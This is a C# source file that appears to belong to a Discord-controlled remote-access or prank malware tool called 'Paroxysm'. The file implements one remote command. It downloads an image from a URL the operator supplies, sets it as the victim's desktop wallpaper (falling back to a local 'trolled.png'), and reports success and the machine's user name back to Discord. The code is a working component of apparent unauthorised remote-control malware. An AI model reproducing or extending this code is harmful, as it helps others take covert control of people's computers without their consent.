using System.Net;
using Discord;
using Paroxysm.Tools;

namespace Paroxysm.Hooks.Actions;

public static class ChangeWallpaperAction
{
    private static async Task<bool> SetWallpaperFromUrl(string imageUrl)
    {
        try
        {
            using WebClient client = new();
            var localImagePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.MyPictures),
                "temp_wallpaper.jpg");
            await client.DownloadFileTaskAsync(new Uri(imageUrl), localImagePath);

            if (SetWallpaper(localImagePath))
            {
                Thread.Sleep(10000);
                File.Delete(localImagePath);
                return true;
            }

            Thread.Sleep(10000);
            File.Delete(localImagePath);
            return false;
        }
        catch
        {
            return false;
        }
    }

    private static bool SetWallpaper(string imagePath)
    {
        var path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.MyPictures), imagePath);
        return HookStatement.SystemParametersInfo(HookStatement.SPI_SETDESKWALL, 0, path,
            HookStatement.SPIF_UPDATE | HookStatement.SPIF_CHANGE) != 0;
    }


    public static async Task<Embed> Follow(string? imageUrl)
    {
        if (await SetWallpaperFromUrl(imageUrl!))
        {
            return EmbedCreator.CreateWithText(Color.Green, "Command was successfully executed.",
                "Image has been set as desktop wallpaper.", Environment.UserName, null);
        }

        const string localImagePath = "trolled.png";
        if (!File.Exists(localImagePath))
        {
            return EmbedCreator.CreateWithText(Color.Red, "Command executed with errors",
                "Unable to set desktop wallpaper.", Environment.UserName, null);
        }

        SetWallpaper(localImagePath);
        return EmbedCreator.CreateWithText(Color.Green, "Command was successfully executed.",
            "Local image was been set as desktop wallpaper.", Environment.UserName, null);
    }
}